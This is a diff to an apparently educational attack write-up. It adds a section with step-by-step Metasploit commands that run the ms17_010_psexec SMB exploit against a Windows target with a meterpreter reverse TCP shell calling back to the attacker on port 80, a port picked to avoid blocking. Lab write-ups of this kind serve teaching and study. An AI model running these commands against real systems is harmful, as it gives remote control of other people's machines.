@@ -335,7 +335,28 @@ Looking at this file using the cat command, we can see that it contains a long h
 
 
 
-### 6. CVE
+### 6. ms17_010_psexec
+
+* Assuming we are already on a machine with Metasploit and that we already know who our target is, these are the steps to use ms17_010_psexec
+
+* Open Metasploit
+    * `msfconsole`
+* Use the ms17_010_psexec exploit for our attack
+    * `use exploit/windows/smb/ms17_010_psexec`
+* Set the payload, your choice. We used the meterpreter reverse tcp shell
+    * `set payload windows/x64/meterpreter/reverse_tcp`
+* Set the target
+    * `set RHOSTS `"TARGET"
+* Set the attackers address
+    * `set LHOST `"Attacker Address"
+* Set the port to attack from, we use 80 because it is least likely to be blocked because of http traffic.
+    * `set LPORT 80`
+* Run the attack
+    * `run`
+
+As you can see from the image below, it is very easy to use this attack:
+
+![Initializing ms17_010_psexec](img/ms17_psexec/Running_ms17_psexec.png)
 
 ## II. Code Walkthrough
 
